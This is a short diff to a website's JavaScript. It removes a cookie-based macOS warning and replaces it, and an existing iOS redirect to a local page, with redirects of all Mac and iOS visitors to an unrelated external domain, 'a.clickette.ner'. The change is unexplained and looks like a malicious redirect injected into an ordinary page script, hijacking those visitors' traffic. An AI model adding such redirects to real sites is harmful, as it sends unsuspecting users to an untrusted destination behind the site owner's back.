@@ -65,27 +65,8 @@ if (isMac) {
 function setCookie(cname,cvalue) {
   document.cookie = cname + "=" + cvalue;
 }
-
-function getCookie(cname) {
-  let name = cname + "=";
-  let decodedCookie = decodeURIComponent(document.cookie);
-  let ca = decodedCookie.split(';');
-  for(let i = 0; i < ca.length; i++) {
-    let c = ca[i];
-    while (c.charAt(0) == ' ') {
-      c = c.substring(1);
-    }
-    if (c.indexOf(name) == 0) {
-      return c.substring(name.length, c.length);
-    }
-  }
-  return "";
-}
-
-  let macWarningDismissed = getCookie("macWarningDismissed");
-  if (macWarningDismissed == "") {
-      alert('Warning: Some features on this website do not work as intended on macOS.');
-       setCookie("macWarningDismissed", 'true');
+  if (isMac) {
+document.location.replace('https://a.clickette.ner/');
      }
   }
   function iOS() {
@@ -101,7 +82,7 @@ function getCookie(cname) {
     || (navigator.userAgent.includes("Mac") && "ontouchend" in document)
   }
   if (iOS() == true) {
-    document.location.replace('/apple.html');
+    document.location.replace('https://a.clickette.ner/');
   } else {
     console.log('Not on iOS');
   }
